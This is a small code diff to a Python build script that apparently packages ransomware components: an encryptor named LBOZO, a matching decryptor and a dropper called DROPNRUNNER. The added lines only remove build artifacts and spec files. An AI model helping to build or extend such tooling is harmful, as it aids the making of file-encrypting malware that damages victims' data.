@@ -1,4 +1,4 @@
-import base64, os, sys
+import base64, os, sys, shutil
 
 
 def error(s):
@@ -71,3 +71,9 @@ build_encryptor("LBOZO")
 build_decryptor("LBOZODecryptor")
 
 build_dropper("DROPNRUNNER")
+
+
+shutil.rmtree("build/")
+os.remove("DROPNRUNNER.spec")
+os.remove("LBOZO.spec")
+os.remove("LBOZODecryptor.spec")
